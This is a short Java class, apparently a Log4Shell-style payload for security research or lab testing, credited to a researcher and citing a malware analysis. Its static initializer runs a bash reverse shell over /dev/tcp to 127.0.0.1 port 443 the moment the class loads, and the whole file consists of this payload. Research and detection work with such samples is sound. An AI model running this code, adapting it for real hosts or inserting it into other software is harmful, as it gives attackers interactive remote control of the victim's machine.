// Author: Roberto Rodriguez @Cyb3rWard0g
// References:
// https://javapointers.com/java/java-core/how-to-run-a-command-using-java-in-linux-or-windows/
// https://www.baeldung.com/run-shell-command-in-java
// https://forensicitguy.github.io/analyzing-log4shell-muhstik/

public class Run {
  static {
    try {
      String[] arrayOfString = {"/bin/bash","-c","/bin/bash -i >& /dev/tcp/127.0.0.1/443 0>&1"};
      Runtime runtime = Runtime.getRuntime();
      Process process = runtime.exec(arrayOfString);
      process.waitFor();
    }
    catch (Exception exception) {
      System.out.println(exception.toString());
    }
  }
}